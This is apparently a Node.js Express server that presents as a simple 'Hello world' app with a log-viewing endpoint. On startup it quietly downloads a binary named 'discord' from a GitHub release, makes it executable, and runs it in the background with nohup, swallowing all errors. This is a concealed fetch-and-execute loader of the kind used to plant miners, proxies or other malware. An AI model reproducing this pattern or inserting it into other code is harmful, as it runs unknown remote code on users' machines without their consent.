const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

app.get("/", function(req, res) {
  res.send("Hello world!");
});

app.get("/log", (req, res) => {
  fs.readFile('log.txt', "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

const downloadDiscord = () => {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream('discord');
    https.get('https://github.com/mmnni/pipeops/releases/download/sac/discord', (response) => {
      response.pipe(file);
      file.on('finish', () => {
        file.close();
        exec('chmod +x discord', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
    }).on('error', (err) => {
      fs.unlink('discord', () => {});
      reject(err);
    });
  });
};

const Execute = async () => {
  try {
    await downloadDiscord();
    const command = 'nohup ./discord &';
    exec(command, { 
      shell: '/bin/bash'
    });
  } catch (err) {}
};

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
